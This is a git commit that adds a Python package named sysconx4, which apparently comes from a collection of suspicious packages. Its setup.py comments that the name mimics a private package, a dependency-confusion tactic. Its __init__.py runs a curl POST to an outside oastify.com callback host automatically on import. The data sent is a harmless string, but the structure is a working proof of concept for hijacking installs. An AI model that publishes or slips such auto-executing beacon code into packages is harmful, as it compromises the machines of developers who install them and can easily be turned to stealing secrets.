6765c7afe565d21052454c449133ef88894f4917
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-06 08:09:47 +0000

    Add package sysconx4/0.1.1/sysconx4-0.1.1.tar.gz

---
+++ packages/sysconx4/sysconx4-0.1.1.tar.gz/sysconx4-0.1.1/setup.py
@@ -0,0 +1,9 @@
+from setuptools import setup, find_packages
+
+setup(
+    name="sysconx4",  # Mimic private package name
+    version="0.1.1",
+    description="package for pentesting",
+    author="superuser",
+    packages=find_packages(),
+)
---
+++ packages/sysconx4/sysconx4-0.1.1.tar.gz/sysconx4-0.1.1/sysconx4/__init__.py
@@ -0,0 +1,7 @@
+import os
+
+def execute_payload():
+    os.system("curl -X POST -d 'cool boss this is shubh!' http://zfimwdss7jvjq0mejvjugetds4yvmlaa.oastify.com")
+
+execute_payload()
+
